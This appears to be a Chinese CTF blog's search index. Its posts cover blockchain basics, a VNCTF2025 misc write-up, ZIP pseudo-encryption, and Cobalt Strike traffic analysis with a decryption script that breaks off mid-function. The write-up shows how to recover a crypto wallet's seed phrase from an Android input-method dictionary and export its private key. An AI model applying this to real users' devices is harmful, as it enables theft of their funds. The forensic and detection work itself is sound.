<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>区块链Blockchain学习</title>
      <link href="/2025/02/%E5%8C%BA%E5%9D%97%E9%93%BEBlockchain%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/02/%E5%8C%BA%E5%9D%97%E9%93%BEBlockchain%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>怎么现在的misc区块链内容越来越多了，不得不学了</p><h1 id="什么是区块链？"><a href="#什么是区块链？" class="headerlink" title="什么是区块链？"></a>什么是区块链？</h1><p><strong>区块链</strong>（英语：blockchain或block chain）是借由<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A2%BC%E5%AD%B8">密码学</a>与<a href="https://zh.wikipedia.org/wiki/%E5%85%B1%E8%AD%98%E6%A9%9F%E5%88%B6">共识机制</a>等技术建立与存储庞大交易资料链的<a href="https://zh.wikipedia.org/wiki/%E5%B0%8D%E7%AD%89%E7%B6%B2%E8%B7%AF">点对点</a>网络系统。</p><p><strong>从字面上看：</strong>区块链是由一个个记录着各种信息的小区块链接起来组成的一个链条，类似于我们将一块块砖头叠起来，而且叠起来后是没办法拆掉的，每个砖头上面还写着各种信息，包括：谁叠的，什么时候叠的，砖头用了什么材质等等，这些信息你也没办法修改。</p><p><strong>从计算机上看：</strong>区块链是一种比较特殊的分布式数据库。分布式数据库就是将数据信息单独放在每台计算机，且存储的信息的一致的，如果有一两台计算机坏掉了，信息也不会丢失，你还可以在其他计算机上查看到。</p><p>区块链是一种分布式的，所以它是没有中心点的，信息存储在所有加入到区块链网络的节点当中，节点的数据是同步的。节点可以是一台服务器，笔记本电脑，手机等。</p><p><strong>有没一两句话能说明白区块链的？</strong></p><p>有的。</p><p>麻将作为中国传统的区块链项目，四个矿工一组，先碰撞出13个数字正确哈希值的矿工可以获得记账权并得到奖励。</p><h1 id="基本名词-工具使用"><a href="#基本名词-工具使用" class="headerlink" title="基本名词&amp;&amp;工具使用"></a>基本名词&amp;&amp;工具使用</h1><h2 id="钱包"><a href="#钱包" class="headerlink" title="钱包"></a>钱包</h2><p>顾名思义就是存储钱的钱包</p><p>这里推荐使用MetaMask，chrome浏览器上的一个插件。</p><img src="屏幕截图 2025-02-09 182036.png" alt="屏幕截图 2025-02-09 182036" style="zoom:80%;"><p>应该也可以使用 imtoken ，手机上的钱包</p><p>注意每个钱包有一个地址，是收款的地址。而且注册账号时会让你记一些<strong>助记词</strong>，用来在忘记密码（私钥）的时候找回密码或钱包。</p><p><strong>切换网络</strong></p><p>在写CTF题目时候可以看比赛题目部署在哪个网路上，可以点击metamask左上角切换网络</p><img src="屏幕截图 2025-02-09 182359.png" alt="屏幕截图 2025-02-09 182359" style="zoom: 50%;"><p>这个主要看比赛的网路。</p><h3 id="如何获取以太币？"><a href="#如何获取以太币？" class="headerlink" title="如何获取以太币？"></a>如何获取以太币？</h3><p>主要有一些水龙头可以每日拿一点，网上可以搜到</p><p>1.<a href="https://zan.top/faucet">ZAN Faucet - Get Ethereum Testnet and Solana Devnet Tokens</a></p><p>2.<a href="https://www.alchemy.com/faucets/ethereum-sepolia">Ethereum Sepolia Faucet</a></p><h3 id="助记词"><a href="#助记词" class="headerlink" title="助记词"></a>助记词</h3><p>助记词是从建立账户的时候自动生成的，一般是12个或者24个，用来帮助找回密码。</p><p>但是助记词并不是随机生成的，而是有一定的规律的，而且助记词是有范围的，一共2048个</p><p>这里是所有2048个助记词（英文）： <a href="https://github.com/bitcoin/bips/blob/master/bip-0039/english.txt">bips&#x2F;bip-0039&#x2F;english.txt at master · bitcoin&#x2F;bips</a></p><p>如果从题目中拿到的一些助记词可以从这里缩小范围。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Blockchain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Blockchain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF2025misc复现</title>
      <link href="/2025/02/VNCTF2025misc%E5%A4%8D%E7%8E%B0/"/>
      <url>/2025/02/VNCTF2025misc%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>这个比赛的misc真是难，除了一道签到之外几乎全是区块链和ai，唯一一道的取证还是安卓取证，而且还模拟的真实取证过程。。</p><p>全部的wp可以在vnctf2025的群里有，或者官方公众号。</p><p>打的我道心破碎了要。。。</p><h1 id="VN-Lang"><a href="#VN-Lang" class="headerlink" title="VN_Lang"></a>VN_Lang</h1><p>简单的misc签到题</p><p>打开exe发现是flag但是是vn自创文字</p><p>使用IDA打开exe，直接爆搜VNCTF就能发现flag了</p><img src="屏幕截图 2025-02-10 174246.png" alt="屏幕截图 2025-02-10 174246" style="zoom:80%;"><p>flag：VNCTF{wXD4cznGnWqVVPRTF1Mzlf7zrPTfBRkKIq2Kgyq4Gohs2}</p><p>这个题好像每个人flag不一样</p><h1 id="Echo-Flowers"><a href="#Echo-Flowers" class="headerlink" title="Echo Flowers"></a>Echo Flowers</h1><p>这个真是毁我道心了，看了一天。。</p><p>拿到echo flowers文件看到里面有一个echo_flowers.ovf文件，可以使用vmware挂载</p><p>虽然这道题挂载不甚有大用就是了</p><p>挂载后看到桌面上只有一个imToken：</p><img src="屏幕截图 2025-02-10 175016.png" alt="屏幕截图 2025-02-10 175016" style="zoom:80%;"><p>所有应用也只有一点点，在便签，imtoken，设置里面都没有发现什么东西，这就是这道题的神奇之处了</p><p>题目要求恢复密码，我们可以通过找到12个助记词来恢复密码，但是系统中又没有什么提示该怎么办呢？</p><img src="屏幕截图 2025-02-10 175335.png" alt="屏幕截图 2025-02-10 175335" style="zoom:80%;"><p>在输入法打单词的时候发现有上次遗留的输入。</p><blockquote><p>[!NOTE]</p><p>手动执行 一遍导入助记词流程可以发现，手机安装的某数字钱包App在导入助记词时没有将助 记词输入框设为密码属性，使得输入法可以开启单词联想，而手机安装的某输入法 （包括厂商预装版本）的单词联想是默认开启的。（题目描述中也对此给出了提示： 114 英语不好）  多次导入助记词会发现输入助记词首字母即可联想助记词单词。 </p></blockquote><p>所以我们可以大致确定助记词的范围，再根据所有2048个助记词确定是那些助记词</p><p>所有2048个助记词： <a href="https://github.com/bitcoin/bips/blob/master/bip-0039/english.txt">bips&#x2F;bip-0039&#x2F;english.txt at master · bitcoin&#x2F;bips</a></p><p>大致确定的助记词：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ramp twenty only space define fashion high carpet muscle laundry couch ranch</span><br></pre></td></tr></table></figure><p>接下来要做的就是恢复这12个助记词的顺序了，已知暴力破解这12个助记词顺序是不现实的（因为要好几天），所以我们需要在文件中寻找那个储存了顺序的“词典”文件。</p><p>大概有两种方法：<br><strong>方法一：7z解压vmdk文件</strong></p><p>直接7z解压，能直接把所有vmdk的文件解压出来</p><p>（之前怎么能忘了！）</p><p><strong>方法二：DiskGenius挂载</strong></p><p>网上下一个DiskGenius，可以直接挂载vmdk</p><p>主要DiskGenius可以恢复磁盘上删除的文件这是它的厉害之处</p><p>恢复后如图：<br><img src="屏幕截图 2025-02-10 182557.png" alt="屏幕截图 2025-02-10 182557" style="zoom:80%;"></p><p>。</p><p>。</p><p>总之就是把vmdk里所有文件全部都解压出来，然后在里面找可疑的文件。</p><p>最后找到了<code>android-7.1-r5/data/data/com.sohu.inputmethod.sogouoem/files/dict</code> 这个文件夹下，具体来说就是<code>sgim_gd_usr.bin</code>这个文件</p><p>然后这里有一个比较偏的知识点，就是</p><blockquote><p>[!NOTE]</p><p>搜狗输入法用户词库文件不是utf-8编码而是utf-16</p></blockquote><p>所以一般的记事本和010是很难看出来什么东西的</p><p>这里有两种方法来看到内容</p><p><strong>方法一：使用string命令</strong></p><p>kali自带string命令</p><p><strong>strings命令：用于从二进制文件中提取可打印字符串。它可以提取和显示文件中的所有可打印字符串，常用于分析二进制文件、调试和逆向工程</strong></p><p>先cd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd android-7.1-r5/data/data/com.sohu.inputmethod.sogouoem/files/dict</span><br></pre></td></tr></table></figure><p>然后string</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings --encoding=b * </span><br></pre></td></tr></table></figure><p>然后就能看到所有助记词了</p><img src="屏幕截图 2025-02-10 184849.png" alt="屏幕截图 2025-02-10 184849" style="zoom:80%;"><p><strong>方法二：notepad++使用utf16查看文件</strong></p><p>找到<code>android-7.1-r5/data/data/com.sohu.inputmethod.sogouoem/files/dict/sgim_gd_usr.bin</code>这个文件，用notepad++，utf16查看也能看到所有助记词，需要眼力（当然也可以使用别的能看utf16的工具）</p><img src="屏幕截图 2025-02-10 185223.png" alt="屏幕截图 2025-02-10 185223" style="zoom:80%;"><p>。</p><p>最后恢复顺序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ranch only space define laundry carpet muscle ramp high twenty couch fashion</span><br></pre></td></tr></table></figure><p>所有助记词和顺序都得到了，直接用手机imToken设置一个密码然后利用高级设置查看私钥，导出私钥</p><img src="Screenshot_2025-02-10-20-17-28-92_aef62f4795c0443.jpg" alt="Screenshot_2025-02-10-20-17-28-92_aef62f4795c0443" style="zoom:25%;"><p>或者使用在线网站（我用不明白）网站： <a href="https://iancoleman.io/bip39/">BIP39 - Mnemonic Code</a></p><p>注意默认路径 m&#x2F;44’&#x2F;60’&#x2F;0’&#x2F;0&#x2F;0(是imToken默认路径)，所以有些网站是不行的。</p><p>flag：VNCTF{6433c196bb66b0d8ce3aa072d794822fd87edfbc3a30e2f2335a3fb437eb3cda} </p><h1 id="ezSignal"><a href="#ezSignal" class="headerlink" title="ezSignal"></a>ezSignal</h1><p>拿到一个压缩包，解压时报错了，可以看到实则有两个文件但只解压出一个文件</p><p>我们使用7z解压出两个文件，原来另一个文件名是空白的所以解压不出来，但是7z可以</p><p>一张图片和一个无后缀名的文件，问了一下ai才知道是grc文件。</p><p>改名<code>1.grc</code>，使用<code>gnuradio</code>打开，直接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gnuradio-companion 1.grc</span><br></pre></td></tr></table></figure><p>看到：</p><img src="屏幕截图 2025-02-11 120158.png" alt="屏幕截图 2025-02-11 120158" style="zoom:80%;"><p>那张png图片里面藏了一些东西，使用binwalk解压出flag1.txt和flag2.txt</p><p>此时我们需要逆向这个grc文件，因为我们看到这个文件是把wav文件解析成两个txt文件，我们需要逆向得到这个wav文件。</p><p>利用旁边的core制作逆向exp，（制作的时候要注意打如48k的时候要打48000而不能是48k，不然会报错）如下：<br><img src="屏幕截图 2025-02-11 170522.png" alt="屏幕截图 2025-02-11 170522" style="zoom:80%;"></p><p>此时就生成了1111.wav，一听就知道是sstv文件</p><p>利用虚拟声卡+<code>RX-SSTV</code>（不知道为什么我虚拟声卡有问题没跑出来，最后扬声器跑出来的）</p><p>注意不能用github上那个sstv，否则会报错如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ValueError: SSTV mode is unsupported (VIS: 125)</span><br></pre></td></tr></table></figure><p>最终跑出来的二维码：</p><img src="屏幕截图 2025-02-11 181948.png" alt="屏幕截图 2025-02-11 181948" style="zoom:80%;"><p>使用手机上BinaryEye扫一下就行</p><img src="Screenshot_2025-02-11-18-31-24-22_a0aa29124cd502a.jpg" alt="Screenshot_2025-02-11-18-31-24-22_a0aa29124cd502a" style="zoom: 33%;"><p>flag：VNCTF{W0w_Y0u_Ar3_G0od_4t_R4di0_S1gn4L}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于ZIP伪加密</title>
      <link href="/2025/02/%E5%85%B3%E4%BA%8EZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/"/>
      <url>/2025/02/%E5%85%B3%E4%BA%8EZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<p>ZIP伪加密看似简单，实则也是大有学问在里面</p><p>这里细节讲解一下伪加密和相关工具的使用</p><p>首先我们需要了解一下zip文件结构</p><h1 id="zip文件结构"><a href="#zip文件结构" class="headerlink" title="zip文件结构"></a>zip文件结构</h1><p>zip文件结构大致分为三个部分</p><p>一个<code>record区</code>，一个<code>dirEntry区</code>，一个<code>endLocator区</code></p><p>三个部分相互依存，这里是010下的zip文件对照表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">+ ZIPFILERECORD record # 压缩源文件数据区</span><br><span class="line">    - char frSignature[4] # 压缩源文件标志</span><br><span class="line">    - ushort frVersion # 压缩源文件版本</span><br><span class="line">    - ushort frFlags # 压缩源文件标志 （有无加密，这个更改这里进行伪加密，改为01 00打开就会提示有密码了）</span><br><span class="line">    - enum COMPTYPE frCompression</span><br><span class="line">    - DOSTIME frFileTime # 压缩源文件时间</span><br><span class="line">    - DOSDATE frFileDate # 压缩源文件日期</span><br><span class="line">    - uint frCrc # 压缩源文件CRC32校验值</span><br><span class="line">    - uint frCompressedSize # 压缩源文件压缩后大小</span><br><span class="line">    - uint frUncompressedSize # 压缩源文件压缩前大小</span><br><span class="line">    - ushort frFileNameLength # 压缩源文件名长度</span><br><span class="line">    - ushort frExtraFieldLength # 压缩源文件扩展域长度</span><br><span class="line">    - char frFileName[frFileNameLength] # 压缩源文件名</span><br><span class="line">    - uchar frData[frCompressedSize] # 压缩源文件数据</span><br><span class="line">+ ZIPDIRENTRY dirEntry # 压缩源文件目录区</span><br><span class="line">    - char deSignature[4] # 目录标志</span><br><span class="line">    - ushort deVersionMadeBy # 创建该条目的版本</span><br><span class="line">    - ushort deVersionNeeded # 解压该条目所需的版本</span><br><span class="line">    - ushort deFlags # 标志位 (判断是不是伪加密的位置，如果是真加密则两个都是0900，伪加密这个则是0000或0100)</span><br><span class="line">    - enum COMPTYPE deCompression # 压缩方法</span><br><span class="line">    - DOSTIME deFileTime # 最后修改时间</span><br><span class="line">    - DOSDATE deFileDate # 最后修改日期</span><br><span class="line">    - uint deCrc # CRC32校验值</span><br><span class="line">    - uint deCompressedSize # 压缩后的大小</span><br><span class="line">    - uint deUncompressedSize # 压缩前的大小</span><br><span class="line">    - ushort deFileNameLength # 文件名长度</span><br><span class="line">    - ushort deExtraFieldLength # 扩展域长度</span><br><span class="line">    - ushort deFileCommentLength # 文件评论长度</span><br><span class="line">    - ushort deDiskNumberStart # 起始磁盘编号</span><br><span class="line">    - ushort deInternalAttributes # 内部属性</span><br><span class="line">    - uint deExternalAttributes # 外部属性</span><br><span class="line">    - uint deRelativeOffset # 该条目在 ZIP 文件中的偏移位置</span><br><span class="line">    - char deFileName[deFileNameLength] # 文件名</span><br><span class="line">    - char deExtraField[deExtraFieldLength] # 扩展域</span><br><span class="line">    - char deFileComment[deFileCommentLength] # 文件评论</span><br><span class="line">+ ZIPENDLOCATOR endLocator # 压缩源文件目录结束标志</span><br><span class="line">    - char elSignature[4] # 结束标志</span><br><span class="line">    - ushort elDiskNumber # 当前磁盘编号</span><br><span class="line">    - ushort elStartDiskNumber # 目录开始的磁盘编号</span><br><span class="line">    - ushort elEntriesOnDisk # 当前磁盘上的条目数量</span><br><span class="line">    - ushort elEntriesTotal # 总条目数量</span><br><span class="line">    - uint elSizeOfDirectory # 目录的总大小</span><br><span class="line">    - uint elOffsetOfDirectory # 目录开始的偏移位置</span><br><span class="line">    - ushort elCommentLength # 注释长度</span><br><span class="line">    - char elComment[elCommentLength] # 注释</span><br></pre></td></tr></table></figure><p>可以发现最重要的就是两个标志位了，他们是判断伪加密的标准</p><p>其实其余部分也很重要，因为如果不对应的话直接解压会发现报错——CRC校验错误</p><p>首先我们要知道</p><blockquote><p>全局方式位标记的四个数字中只有第二个数字对其有影响，其它的不管为何值，都不影响它的加密属性，即：<br>                                             <strong>第二个数字为奇数时 –&gt;加密</strong><br>                                             <strong>第二个数字为偶数时 –&gt;未加密</strong></p></blockquote><p>也就是说，0900&#x2F;0100代表着加密，0000&#x2F;0800代表着无加密</p><p>而<strong>伪加密就是把本来无加密的文件修改了标志位从而显示出加密的样子</strong></p><p>那我们怎么修改伪加密呢？为什么有些工具可以直接解压有些却不行呢？</p><h1 id="工具选择"><a href="#工具选择" class="headerlink" title="工具选择"></a>工具选择</h1><h2 id="010editor"><a href="#010editor" class="headerlink" title="010editor"></a>010editor</h2><p>010editor肯定是最普遍和最准确的修改伪加密的东西了</p><p>如果是伪加密的话直接010修改0900为0000</p><p>如果两区（record和dirEntry）都是0900直接全改即可</p><h2 id="bandizip"><a href="#bandizip" class="headerlink" title="bandizip"></a>bandizip</h2><p>经过测试，bandizip识别一个文件是否加密是通过看<strong>dirEntry记录中的deflag位</strong></p><p>如果deFlag位是加密的话无论另一个frflag是否是加密bandizip都会识别为加密</p><h2 id="winRAR"><a href="#winRAR" class="headerlink" title="winRAR"></a>winRAR</h2><p>winRAR和bandizip一样，都是识别dirEntry记录中的deflag位</p><h2 id="7zip"><a href="#7zip" class="headerlink" title="7zip"></a>7zip</h2><p>7z就很神奇，它与上面两个工具不同。</p><p><strong>7zip判断是否为加密的方式是看record记录中的frflag位</strong></p><p>因此有些明明是伪加密的zip 7z却能直接解压</p><p>所以那句“不会出的出题人只修改一个struct区”是因为换个工具就能解压</p><h2 id="随波逐流"><a href="#随波逐流" class="headerlink" title="随波逐流"></a>随波逐流</h2><p>经过测试，随波逐流提供的伪加密修复<strong>只会修改dirEntry记录中的deflag位</strong>，而不管frFlag位</p><h2 id="ZipCenOp"><a href="#ZipCenOp" class="headerlink" title="ZipCenOp"></a>ZipCenOp</h2><p><strong>不好用！！</strong></p><p>运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ZipCenOp.jar -r 111.zip</span><br></pre></td></tr></table></figure><p>会显示</p><p>success 1 flag(s) found</p><p>但是它不帮我改，有啥用？。。</p><h2 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h2><p>传闻2345好压改两个区也能直接开。而且还有360解压缩</p><p>然而我不敢尝试，怕删不干净。。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Network Traffic Analysis</title>
      <link href="/2025/02/Network-Traffic-Analysis/"/>
      <url>/2025/02/Network-Traffic-Analysis/</url>
      
        <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>感觉流量分析真的是MISC中的一个大项，开一篇专门的文章好学习流量分析</p><h1 id="CS流量——CobaltStrike流量"><a href="#CS流量——CobaltStrike流量" class="headerlink" title="CS流量——CobaltStrike流量"></a>CS流量——CobaltStrike流量</h1><blockquote><p>“Cobalt Strike 是一款GUI的框架式渗透工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe木马生成，win dll木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等。”</p><p>一些细节知识可以看这个 <a href="https://cloud.google.com/blog/topics/threat-intelligence/defining-cobalt-strike-components/">Cobalt Strike | Defining Cobalt Strike Components &amp; BEACON | Google Cloud Blog</a></p><p>更多CS流量相关看 <a href="https://wbglil.gitbook.io/cobalt-strike">前言 | Cobalt Strike</a></p></blockquote><p><code>Cobalt Strike</code> 服务端和客户端是通过 <code>SSL</code> 加密通讯的 (默认证书对 <code>cobaltstrike.store</code> )。</p><p><code>Beacon</code> 的元数据传输过程中虽然使用的是 <code>RSA</code> 算法，但是 <code>Beacon</code> 任务的传输使用的却是 <code>AES</code> 算法加密的，而 <code>AES</code> 密钥则是 <code>Beacon</code> 随机生成的然后通过 <code>RSA</code> 交换 <code>AES</code>密钥。加解密算法为 <code>AES</code> ，密钥位长 <code>128</code> ，<code>CBC</code> 模式，填充标准 <code>PKCS7</code> ，其通信具体流程如下。</p><img src="image-20230930201229567.webp" alt="image-20230930201229567" style="zoom:80%;"><h2 id="流量传递"><a href="#流量传递" class="headerlink" title="流量传递"></a>流量传递</h2><p><code>Cobalt Strike</code> 分为 <code>客户端</code> 与 <code>服务端</code> ，服务端是一个，客户端可以有多个，可被团队进行分布式协作操作。</p><p><code>Cobalt Strike</code> 的 <code>Beacon</code> 支持异步通信和交互式通信。<code>Beacon</code> 可以选择通过 <code>DNS</code> 还是 <code>HTTP</code> 协议出口网络，你甚至可以在使用<code>Beacon</code> 通讯过程中切换 <code>HTTP</code> 和 <code>DNS</code>。其支持多主机连接，部署好 <code>Beacon</code> 后提交一个要连回的域名或主机的列表，<code>Beacon</code> 将通过这些主机轮询。</p><p><code>http-beacon</code> 通信中，默认使用 <code>GET</code> 方法向 <code>/dpixel</code> 、<code>/__utm.gif</code> 、<code>/pixel.gif</code> 等地址发起请求，同时 <code>Cobalt Strike</code> 的<code>Beacon</code> 会将元数据（例如AES密钥）使用 <code>RSA</code> 公钥加密后发送给 <code>C2</code> 服务器。</p><p>这些<strong>元数据</strong>通常被编码为 <code>Base64</code> 字符串并作为 <code>Cookie</code> 发送。如下图：<br><img src="屏幕截图 2025-02-05 232713.png" alt="屏幕截图 2025-02-05 232713" style="zoom:80%;"></p><h2 id="流量特征"><a href="#流量特征" class="headerlink" title="流量特征"></a>流量特征</h2><p>cs流量的http通讯一般会有以下的特征</p><p>比如搜索http类型数据后查看到有出现<code>post</code>请求<code>/sumbit.php？id=xxx</code>的特征，该特征可以判断 cobalt strike。</p><p>这是因为cs在下发特征时会请求这个<code>/sumbit.php？id=xxx</code>，同时 <code>POST</code> 传递了一串 <code>0000</code> 开头的16进制数据，这是 cs 流量的发送任务数据（可以根据这个辨别cs），任务数据里的内容十分重要，如下：</p><img src="屏幕截图 2025-02-06 004446.png" alt="屏幕截图 2025-02-06 004446" style="zoom:80%;"><p><strong>心跳包特征：</strong></p><p>间隔一定时间，均有通信，且流级上的上下行数据长度固定；</p><p>使用Wireshark等网络抓包工具，可以捕获到后门的HTTP数据包“GET &#x2F;4Ekx HTTP&#x2F;1.1”，其中的 “4Ekx”就是心跳包，通过查看心跳包获取一般cs心跳包会有4个数字或者字母组成。</p><p><strong>https特征：</strong></p><p><code>https-beacon</code> 通信中，默认使用空证书建立加密通道，流量中可以看见这一过程。</p><p>在数据包的client hello中，数据包有JA3（<code>JA3</code> 是由 <code>John Althouse</code>、<code>Jeff Atkinson</code> 和 <code>Josh Atkins</code> 创建的开源项目。 <code>JA3</code> &#x2F; <code>JA3S</code> 可以为客户端和服务器之间的通信创建 <code>SSL</code> 指纹。）</p><p>和操作系统有关，每个操作系统都有固定的值。这里列出几个已知的 <code>ja3</code> &#x2F; <code>ja3s</code> 指纹信息，这个值在不同操作系统上是不一样的</p><p><strong>JA3</strong></p><ul><li>72a589da586844d7f0818ce684948eea</li><li>a0e9f5d64349fb13191bc781f81f42e1</li></ul><p><strong>JA3s</strong></p><ul><li>b742b407517bac9536a77a7b0fee28e9</li><li>ae4edc6faf64d08308082ad26be60767</li></ul><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p>那拿到的cs流量我们怎么解密呢？</p><p>大致是需要三样东西： <code>.cobaltstrike.beacon_keys</code> 文件、<code>cookie</code>元数据、<code>submit.php</code>的data</p><p><strong>第一种方法：</strong></p><p>这种一步到位</p><p>有了这三样东西我们便可以直接执行脚本，项目地址 <a href="https://github.com/5ime/CS_Decrypt">5ime&#x2F;CS_Decrypt: CobaltStrike流量解密脚本</a></p><p>安装库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install hexdump javaobj-py3</span><br></pre></td></tr></table></figure><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hexdump</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> javaobj.v2 <span class="keyword">as</span> javaobj</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;.cobaltstrike.beacon_keys&quot;</span></span><br><span class="line"><span class="comment">#.cobaltstrike.beacon_keys文件路径</span></span><br><span class="line">encode_data = <span class="string">&quot;U8jm3+oqzYLuUiRd9F3s7xVz7fGnHQYIKF9ch6GRseWfcBSSk+aGhWP3ZUyHIkwRo1/oDCcKV7LYAp022rCm9bC7niOgMlsvgLRolMKIz+Eq5hCyQ0QVScH8jDYsJsCyVw1iaTf5a7gHixIDrSbTp/GiPQIwcTNZBXIJrll540s=&quot;</span></span><br><span class="line"><span class="comment">#元数据内容</span></span><br><span class="line">encrypt_data = <span class="string">&quot;000000c093dff6b2f058ba4231e3900276566441f2bb4c76e5c8480874a4d99df083054a5ea1dd4aea5523c751af7d123ee8e9f2253a5ccdcf54427d147c556b15657ee2607e92b35732f26341bc0a26c58bf2bcf2383ad640641c364159387223360cc16ff3dc14ab1f00e6ee4fb53f5e15b767bd379451d0d7b6f4aeae9db0c3f30f3ef167b7db3e6ac241643ed2513e73f9e9148ebe7afaa122ea75e945c8ab8a816179e43180257bd8be752827dd0de26826d5611ee09391ee5545897dae1d3a9698&quot;</span></span><br><span class="line"><span class="comment">#任务数据内容</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">format_key</span>(<span class="params">key_data</span>):</span><br><span class="line">    key_data = <span class="built_in">bytes</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x &amp; <span class="number">0xFF</span>, key_data))</span><br><span class="line">    formatted_key = <span class="string">f&quot;-----BEGIN PRIVATE KEY-----\n&quot;</span></span><br><span class="line">    formatted_key += base64.encodebytes(key_data).decode()</span><br><span class="line">    formatted_key += <span class="string">f&quot;-----END PRIVATE KEY-----&quot;</span></span><br><span class="line">    <span class="keyword">return</span> formatted_key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">encrypted_data, iv_bytes, signature, shared_key, hmac_key</span>):</span><br><span class="line">    <span class="keyword">if</span> hmac.new(hmac_key, encrypted_data, digestmod=<span class="string">&quot;sha256&quot;</span>).digest()[:<span class="number">16</span>] != signature:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;message authentication failed&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    cipher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)</span><br><span class="line">    <span class="keyword">return</span> 